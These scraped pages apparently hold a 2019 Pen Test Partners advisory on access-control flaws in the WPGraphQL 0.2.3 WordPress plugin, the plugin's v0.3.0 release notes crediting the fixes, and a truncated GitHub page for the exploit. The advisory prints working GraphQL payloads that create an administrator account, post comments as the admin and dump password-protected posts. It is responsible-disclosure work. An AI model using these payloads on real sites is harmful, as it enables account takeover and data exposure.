=== Content from www.pentestpartners.com_e9ff5627_20250120_234424.html ===


[![Pen Test Partners Logo](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-ptp.png)

Security consulting and testing services](https://www.pentestpartners.com)

+44 20 3095 0500

+1 646 693 2501

* [About](https://www.pentestpartners.com/about-us/)
  + [PTP in the USA](https://www.pentestpartners.com/about-us/ptp-in-the-usa/)
  + [Careers](https://www.pentestpartners.com/about-us/careers/)
  + [Our Vision and Values](https://www.pentestpartners.com/our-vision-and-values/)
  + [In the news](https://www.pentestpartners.com/about-us/in-the-news/)
  + [Environmental Statement](https://www.pentestpartners.com/about-us/environmental-statement/)
  + [Vulnerability Disclosure Policy](https://www.pentestpartners.com/about-us/vulnerability-disclosure-policy/)
* [Services](https://www.pentestpartners.com/penetration-testing-services/)
  + [Red Teaming](https://www.pentestpartners.com/penetration-testing-services/red-teaming/)
  + [Purple Teaming](https://www.pentestpartners.com/penetration-testing-services/purple-teaming/)
  + [Penetration Testing](https://www.pentestpartners.com/penetration-testing-services/penetration-testing/)
  + [Agile Environment Testing](https://www.pentestpartners.com/penetration-testing-services/agile-environment-testing/)
  + [Aviation Cyber Security Testing](https://www.pentestpartners.com/penetration-testing-services/aviation-cyber-security-testing/)
  + [Automotive & IoT Testing](https://www.pentestpartners.com/penetration-testing-services/automotive-and-iot-testing/)
  + [Maritime Cyber Security Testing](https://www.pentestpartners.com/penetration-testing-services/maritime-cyber-security-testing/)
  + [Cloud Services Security](https://www.pentestpartners.com/penetration-testing-services/cloud-services-security/)
  + [DevOps Lifecycle Assurance](https://www.pentestpartners.com/devops-lifecycle-assurance/)
  + [Social Engineering](https://www.pentestpartners.com/penetration-testing-services/social-engineering/)
  + [Physical Security](https://www.pentestpartners.com/penetration-testing-services/physical-security/)
  + [Security Training](https://www.pentestpartners.com/penetration-testing-services/security-training/)
  + [Papa ‚Äì Proactive Advanced Password Auditor](https://www.pentestpartners.com/penetration-testing-services/papa/)
  + [ICS, IIoT, SCADA Security Testing](https://www.pentestpartners.com/penetration-testing-services/ics-iiot-scada-security-testing/)
  + [CBEST Red Teaming](https://www.pentestpartners.com/penetration-testing-services/cbest-threat-intelligence-led-red-teaming/)
  + [CREST OVS Mobile & Apps](https://www.pentestpartners.com/crest-owasp-verification-standard-ovs-program/)
  + [TIBER-EU Assessments](https://www.pentestpartners.com/penetration-testing-services/tiber-eu-assessments/)
  + [CREST STAR-FS](https://www.pentestpartners.com/penetration-testing-services/crest-star-fs-assessments/)
  + [Cyber Essentials Testing](https://www.pentestpartners.com/penetration-testing-services/cyber-essentials-testing/)
  + [Cyber Security Consulting](https://www.pentestpartners.com/penetration-testing-services/cyber-security-consulting/)
  + [Compromise Assessment](https://www.pentestpartners.com/compromise-assessment/)
  + [Digital Forensics Services](https://www.pentestpartners.com/digital-forensics-services/)
  + [Incident Response Services](https://www.pentestpartners.com/incident-response-services/)
  + [Incident Response Retained Service](https://www.pentestpartners.com/incident-response-retained-service/)
  + [Incident Response Policy Assessment & Development](https://www.pentestpartners.com/incident-response-policy-assessment-development/)
  + [Attack Surface Assessment](https://www.pentestpartners.com/attack-surface-assessment/)
* [Events](https://www.pentestpartners.com/events-and-speaking/)
* [Security Blog](https://www.pentestpartners.com/security-blog/)
* [Demo Videos](https://www.pentestpartners.com/resources/hack-demo-videos/)
* [Contact Us](https://www.pentestpartners.com/contact-us/)

For the best user experience please upgrade your browser

Blog: Vulnerability Advisory

# Pwning WordPress GraphQL

Simone Q
08 May 2019

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql-HEADER.png)

Third-party plugins are often the security Achilles heel of Content Management Systems (CMS). It seems like not a month goes by without one security researcher or another uncovers a vulnerability in a plugin, undermining the security of the whole platform.

Plugins are used to add functionality that‚Äôs missing from the core CMS, but using them can be fraught as not all plugins are created equal. What you hope will add to the user (and Admin) experience could well be the undoing of your security.

In this post we analyse the security of the increasingly popular [WPGraphQL](https://www.wpgraphql.com/)¬† plugin.

GraphQL is a query language for APIs that was open-sourced by Facebook in 2015 and has been used in production by Facebook since 2012. The plugin brings that functionality to WordPress websites.

### TL;DR?

Without authorisation, weak access controls allow us to:

* Create administrative users
* Post comments on articles bypassing article restrictions and global moderation
* Retrieve content of password-protected posts/articles/pages
* Retrieve full list of registered users in the platform
* Retrieve full list of media, comments, themes and plugins with one simple request

The test was performed locally using WordPress 5.1.1 and WPGraphQL 0.2.3

### Where do I start?

‚ÄòIntrospection‚Äô is the answer! It‚Äôs a philosophical approach that serves us well here. We can ask GraphQL schema to list what queries it supports through the following introspection request:

```
{
 __schema{
  queryType{
   name,
   fields{
    name,
    description
          }
        }
      }
}
```

Once parsed, we can identify queries and mandatory parameters we will need to use.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql1.png)

Because WPGraphQL is open source it was easy to identify unprotected functionality, where user‚Äôs privileges were not checked before serving the response to the query.

### Create administrative users

By exploiting this issue, registrations must be open in WordPress. However, it‚Äôs possible to specify the role of the user we‚Äôre registering:

```
mutation{
  registerUser(input: {
    clientMutationId: "UWHATM8",
    email: "[[email¬†protected]](/cdn-cgi/l/email-protection)",
    password: "SuperSecretPassword",
    username: "adm1n",
    roles:["administrator"] })
  {
    clientMutationId
  }
}
```

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql2-1024x121.png)

In that example ‚ÄúUWHATM8‚Äù is just a random string.

Creating an administrative account on WordPress allows a remote attacker to execute arbitrary code by injecting PHP code in themes, plugins or header.php file of WordPress.

### Post comments on articles bypassing article restrictions and global moderation

This vulnerability is also present when comments are moderated globally and if article/post/page comments are disallowed.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql3.png)

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql4.png)

```
mutation{
  createComment(input: {
    postId:6,
    userId:1,
    content:"Test Comment",
    clientMutationId: "UWHATM8"
   })
  {
    clientMutationId
  }
}
```

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql5.png)

The comment will show as approved because the impersonation of the admin user is trusted by the system.

### Retrieve content of password-protected posts/articles/pages

Protected posts/articles/pages are always shown on the main website, but without password the content is not visible, until now‚Ä¶

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql6.png)

The following GraphQL request filters all posts with a password set and show their content in RAW format:

```
{posts(where: {hasPassword: true}){
  edges{
    node{
      title,
      id,
      content(format:RAW)
     }
   }
 }
}
```

Resulting in the content of the article to be disclosed to unauthorised users:

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql7.png)

I developed PoC exploit code for all attack vectors and it‚Äôs [available here](https://github.com/pentestpartners/snippets/blob/master/wp-graphql0.2.3_exploit.py) on the PTP GitHub repository.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql8-1024x668.png)

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql9-1024x136.png)

### Lessons learned

Despite the small impact of this research compared to a core CMS vulnerability, it is important to understand two important concepts:

* As a user, are you aware of all the functionality of the plugin you‚Äôre using? Do you perform a source code review before installing it?
* As a developer, it is important to keep in mind whom has access to data. Do they need to be authenticated to perform a specific action?

All those issues were addressed in WPGraphQL version 0.3.0

### Disclosure timeline

23/03/2019: First contact with the wp-graphql team to report the vulnerabilities

26/03/2019: Confirmation that the issues will be address in version 0.3.0

06/04/2019: Version 0.3.0 released to the public

08/05/2019: Public disclosure of this article

### Share

### Categories

Show all
Android¬†¬†(71)
Automotive Security¬†¬†(24)
Aviation Cyber Security¬†¬†(44)
Blockchain¬†¬†(3)
Breach Handling¬†¬†(1)
Careers At PTP¬†¬†(1)
Cloud Security¬†¬†(5)
Code Repository¬†¬†(1)
Consultancy advice¬†¬†(5)
Consumer Advice¬†¬†(35)
Cyber Essentials¬†¬†(1)
Cyber Liability Insurance¬†¬†(5)
DFIR¬†¬†(29)
Hardware Hacking¬†¬†(19)
Heartbleed¬†¬†(5)
Honeypots¬†¬†(6)
How-Tos¬†¬†(264)
In the news¬†¬†(1)
Internet Of Things¬†¬†(169)
Macs / Apple¬†¬†(31)
Maritime Cyber Security¬†¬†(47)
Medical Device Security¬†¬†(3)
Opinions¬†¬†(107)
OPSEC¬†¬†(9)
OT, ICS, IIoT, SCADA¬†¬†(22)
Passwords¬†¬†(39)
PCI Advice¬†¬†(2)
Ransomware¬†¬†(2)
Red Teaming¬†¬†(26)
Reverse Engineering¬†¬†(12)
Security Blog¬†¬†(808)
Shameless Self Promotion¬†¬†(11)
Show on homepage¬†¬†(6)
Social Engineering¬†¬†(12)
Sustainability¬†¬†(2)
Virtual Environments¬†¬†(1)
Vulnerabilities that aren‚Äôt¬†¬†(4)
Vulnerability Advisory¬†¬†(45)
Vulnerability Disclosure¬†¬†(20)

[# See the other cool stuff we've been doing‚Ä¶](/blog/)

[Consumer Advice

# Security flaws found in tiny phones promoted to children

15 Jan 2025](https://www.pentestpartners.com/security-blog/security-flaws-found-in-tiny-phones-promoted-to-children/)

[DFIR

# Tackling AI threats. Advanced DFIR methods and tools for deepfake detection

13 Jan 2025](https://www.pentestpartners.com/security-blog/tackling-ai-threats-advanced-dfir-methods-and-tools-for-deepfake-detection/)

[Aviation Cyber Security

# The unexpected effects of GPS spoofing on aviation safety

09 Jan 2025](https://www.pentestpartners.com/security-blog/the-unexpected-effects-of-gps-spoofing-on-aviation-safety/)

[DFIR

# 10 Non-tech things you wish you had done after being breached

07 Jan 2025](https://www.pentestpartners.com/security-blog/10-non-tech-things-you-wish-you-had-done-after-being-breached/)

[Aviation Cyber Security

# The surprising existence of the erase button on cockpit voice recorders

03 Jan 2025](https://www.pentestpartners.com/security-blog/the-surprising-existence-of-the-erase-button-on-cockpit-voice-recorders/)

[Services

### Penetration Testing

Find out more ¬ª](https://www.pentestpartners.com/penetration-testing-services/penetration-testing/)

### Our People

Being introduced to, and getting to know your tester is an often overlooked part of the process. Yes, our work is √ºber technical, but faceless relationships do nobody any good.

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-alert.svg)](https://www.pentestpartners.com/penetration-testing-services/suffered-a-security-breach/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-mobile-security.svg)
## Mobile Security](https://www.pentestpartners.com/penetration-testing-services/mobile-security/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-social-engineering-grey.svg)
## Social Engineering](https://www.pentestpartners.com/penetration-testing-services/social-engineering/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-webapp.svg)
## Web application testing](https://www.pentestpartners.com/penetration-testing-services/web-application-testing/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-data-compliance-grey.svg)
## Security Consuting](https://www.pentestpartners.com/penetration-testing-services/security-consulting/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-papa-grey.svg)
## Papa - PTP Advance Password Auditor](https://www.pentestpartners.com/penetration-testing-services/papa/)

### Get in touch

**UK Office:**

Pen Test Partners LLP

Unit 2, Verney Junction Business Park

Buckingham

MK18 2LB

United Kingdom

+44 20 3095 0500
[Contact Us ¬ª](/contact-us/)

###

**US Office:**

+1 646 693 2501
[[email¬†protected]](/cdn-cgi/l/email-protection#036a6d656c4373666d77667077736271776d6671702d606c6e)

### Connect

[Twitter](https://twitter.com/PentestPartners)
[LinkedIn](https://www.linkedin.com/company/pen-test-partners)
[YouTube](https://www.youtube.com/channel/UC2HCAhj6JiOsV_PcMFrjykw)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-pentest-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-star-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-star-fs-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/csir-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-ovs-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![logo-cbest](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-cbest.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-check-ncsc.png)](https://www.ncsc.gov.uk/organisations/pen-test-partners)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-assure.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-cyber-essentials2023.png)](https://iasme.co.uk/cyber-essentials/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/bsi-iso27001-logo-22.png)](/content/uploads/2023/12/PTP-ISO27001-Certificate-2023.pdf)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-pci-certified.png)](https://www.pcisecuritystandards.org/assessors_and_solutions/qualified_security_assessors)

[Privacy Policy](/privacy-policy/)

[Terms of Service](/terms-of-website-use/)

Manage Cookies

Company number: OC353362

VAT reg number: GB825526427

¬© 2025 Pen Test Partners



=== Content from github.com_44fcc8d4_20250120_234421.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwp-graphql%2Fwp-graphql%2Freleases%2Ftag%2Fv0.3.0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwp-graphql%2Fwp-graphql%2Freleases%2Ftag%2Fv0.3.0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=wp-graphql%2Fwp-graphql)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[wp-graphql](/wp-graphql)
/
**[wp-graphql](/wp-graphql/wp-graphql)**
Public

* [Notifications](/login?return_to=%2Fwp-graphql%2Fwp-graphql) You must be signed in to change notification settings
* [Fork
  448](/login?return_to=%2Fwp-graphql%2Fwp-graphql)
* [Star
   3.7k](/login?return_to=%2Fwp-graphql%2Fwp-graphql)

* [Code](/wp-graphql/wp-graphql/tree/v0.3.0)
* [Issues
  97](/wp-graphql/wp-graphql/issues)
* [Pull requests
  19](/wp-graphql/wp-graphql/pulls)
* [Discussions](/wp-graphql/wp-graphql/discussions)
* [Actions](/wp-graphql/wp-graphql/actions)
* [Projects
  1](/wp-graphql/wp-graphql/projects)
* [Security](/wp-graphql/wp-graphql/security)
* [Insights](/wp-graphql/wp-graphql/pulse)

Additional navigation options

* [Code](/wp-graphql/wp-graphql/tree/v0.3.0)
* [Issues](/wp-graphql/wp-graphql/issues)
* [Pull requests](/wp-graphql/wp-graphql/pulls)
* [Discussions](/wp-graphql/wp-graphql/discussions)
* [Actions](/wp-graphql/wp-graphql/actions)
* [Projects](/wp-graphql/wp-graphql/projects)
* [Security](/wp-graphql/wp-graphql/security)
* [Insights](/wp-graphql/wp-graphql/pulse)

1. [Releases](/wp-graphql/wp-graphql/releases)
2. [v0.3.0](/wp-graphql/wp-graphql/releases/tag/v0.3.0)

# v0.3.0

Pre-release

Pre-release

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/wp-graphql/wp-graphql/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.3.0)

 Loading

[View all tags](/wp-graphql/wp-graphql/tags)

![@jasonbahl](https://avatars.githubusercontent.com/u/1260765?s=40&v=4)
[jasonbahl](/jasonbahl)
released this
06 Apr 05:49

¬∑
[4688 commits](/wp-graphql/wp-graphql/compare/v0.3.0...master)
to master
since this release

[v0.3.0](/wp-graphql/wp-graphql/tree/v0.3.0)

[`6379a62`](/wp-graphql/wp-graphql/commit/6379a6203da74f283a1211db61d530c2393c161a)

This commit was created on GitHub.com and signed with GitHub‚Äôs **verified signature**.
The key has expired.

GPG key ID: 4AEE18F83AFDEB23
Expired

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

# üöÄ Release Notes

## üí• BREAKING CHANGES & üìñ UPGRADE GUIDE

These features required re-architecting quite a bit of the internals of the plugin. Some classes, functions and filters no longer exist, so if you had a codebase that extended WPGraphQL in any way, we recommend reading the [upgrade guide](https://www.wpgraphql.com/2019/04/05/upgrading-to-v0-3-0/).

## üóí Release Summary

This release had 2 primary focuses: **Model Layer** and **DataLoader (Deferred Resolvers)**. These 2 features are critical to the performance and security of WPGraphQL. Below are some highlights of these features, but you can read more about them [here](https://www.wpgraphql.com/2019/03/27/whats-coming-in-v0-3-0/) as well.

There are also other new features and bugfixes listed below.

### ‚ö°Ô∏èDataLoader

The role of DataLoader is to efficiently load data. It makes use of Deferred resolution of fields, allowing for the fetching of data to happen in batches. You can read more about it [here](https://docs.wpgraphql.com/guides/deferred-resolvers) and [here](https://github.com/wp-graphql/wp-graphql/pull/722#issue-261315185):

### üîê Model Layer

The primary role of the Model Layer is to centralize access checks for objects. Some examples: a "draft" post should only be accessible to authenticated users with proper capabilities to edit posts. User email addresses should only be exposed to authenticated users with the "list\_users" capability. Themes and plugins should only be accessible to authenticated users with proper capabilities as well.

Prior to this release, WPGraphQL helped expose various Types of data, but left the responsibility of controlling "Access" to the site owner by filtering field resolvers and handling Auth checks themselves.

This release puts much more responsibility on the core WPGraphQL plugin where it has a much more restrictive by default approach to exposing data. Data that a vanilla WordPress install doesn't publicly exposed is no longer publicly exposed by WPGraphQL.

Each field can be modified by filters, so if the restrictions WPGraphQL imposes are *too* restrictive, site owners can still adjust the restrictions to allow access to whatever they want users to have access to.

You can read a bit more about this [here](https://www.wpgraphql.com/2019/03/27/whats-coming-in-v0-3-0/) and [here](https://docs.wpgraphql.com/guides/model-layer)

## üí• Breaking Changes

As mentioned above, there are many breaking changes, specifically to how internal data is resolved. Below we've listed some high level breaking changes to look out for, but we recommend reading the [upgrade guide](https://www.wpgraphql.com/2019/04/03/upgrading-to-v0-3-0/) for more information.

* Connection Resolvers have been completely revamped. If you've written your own ConnectionResolvers by extending any of the Connection classes, you will need to refactor your connection. The ConnectionResolvers were previously classes with static functions. They are no longer static, and maintain state of the connection. This allows for the connections to have proper context to pass through to pageInfo and the like. You can read about registering new connections here: <https://docs.wpgraphql.com/extending/connections>
* "roles" on users is now a Connection instead of a listOf strings. (ex: `{user { id, roles { nodes { id, name } } } }`)
* CommentMutation input changed the field `postId` to `commentOn`. The field is the ID of the Post Object that the comment should be connected to, but can be an ID of any Post Type.

### Security Audit

We had a formal security audit performed on the plugin by [Simone Quatrini of Pen Test Partners](https://www.pentestpartners.com/). Fortunately, most of the issues reported by the audit were already being resolved by the Model Layer we had in progress at the time we received the report. Some additional issues were brought to our attention that were not on our radar and were addressed in this release. We recommend updating to this latest version to benefit from all the new features as well as the security fixes. In a week or two, we will publish more information about the security audit, but want to give folks the chance to update the plugin to the latest version before disclosing the issues that were reported.

## ‚ú® New Features

Some of these new features were also mentioned above in Breaking Changes.

* **Updated Docker config** for Travis CI tests to run in PHP 7.3. Thanks [@mngi-arogers](https://github.com/mngi-arogers)!
* **New CursorBuilder class** to provide more stability to cursor based pagination. Really great work here, [@epeli](https://github.com/epeli)!
* Travis CI is now running PHP Code Sniffer checks on the codebase. Currently set to allow fail, but sets us up to get closer to fully adopting WordPress Core Code Standards. Although, [they may be changing](https://make.wordpress.org/core/2019/03/26/coding-standards-updates-for-php-5-6/) soon too. Thanks [@renatonascalves](https://github.com/renatonascalves) for hooking up Travis to run the sniffs!
* **DataLoader / Deferred Resolvers:** This release implements Deferred resolution throughout the entire codebase and provides a way for other datasources to take advantage of the same advantages. You can read more about Deferred resolution here: <https://docs.wpgraphql.com/guides/deferred-resolvers/>
* **Loaders added to AppContext:** DataLoader classes are now registered within AppContext and passed down to all Resolvers to make use of already cached data and centralized fetching (instead of relying on Globals). As part of this we got things hooked things up to allow for additional third party loaders to be added to AppContext via filter. Thanks for your work on this, [@kidunot89](https://github.com/kidunot89)!
* **Revamped Connection Resolvers:** Along with DataLoader, we revamped resolvers for Connections, making it much easier to create custom connection resolvers. You can read about registering connections here: <https://docs.wpgraphql.com/extending/connections>
* **Model Layer:** You can read more about the Model Layer here: <https://docs.wpgraphql.com/guides/model-layer>. Thanks for all your work on this feature, [@CodeProKid](https://github.com/CodeProKid)!
* **Revisions Support:** You can now query revisions of Posts (or post\_types).
* **DataSource methods expect different arguments now**. You must pass `$context` from resolvers to the DataSource methods now, to take advantage of Deferred resolution.
* **Resolvers now receive instances of a Model** instead of instances of `\WP_Post` or `\WP_User`, etc. If you were registering fields to PostObject Types, or Term Types or User Types, or almost anything, if the object being passed as the first argument of the resolver was a core `\WP_*` class instance, it will now be a WPGraphQL `Model` instance. . .for example: `\WP_Post` is now `\WPGraphQL\Model\Post` being passed in.

## üêõ Bugfixes

* Adjustments to Cursor ordering / filters to support order by meta (or other values). Thanks [@epeli](https://github.com/epeli)!
* All sorts of access control data leaks. The Model Layer now restricts data that should be restricted and exposes it only to those with proper capabilities to view it. Thanks again to Simone for working with us on the Security Audit and providing us with a detailed report, and verifying that the issues had been properly resolved in this release!

 Assets
2

 Loading

All reactions

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_52362db4_20250120_234420.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpentestpartners%2Fsnippets%2Fblob%2Fmaster%2Fwp-graphql0.2.3_exploit.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpentestpartners%2Fsnippets%2Fblob%2Fmaster%2Fwp-graphql0.2.3_exploit.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=pentestpartners%2Fsnippets)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pentestpartners](/pentestpartners)
/
**[snippets](/pentestpartners/snippets)**
Public

* [Notifications](/login?return_to=%2Fpentestpartners%2Fsnippets) You must be signed in to change notification settings
* [Fork
  23](/login?return_to=%2Fpentestpartners%2Fsnippets)
* [Star
   30](/login?return_to=%2Fpentestpartners%2Fsnippets)

* [Code](/pentestpartners/snippets)
* [Issues
  1](/pentestpartners/snippets/issues)
* [Pull requests
  0](/pentestpartners/snippets/pulls)
* [Actions](/pentestpartners/snippets/actions)
* [Projects
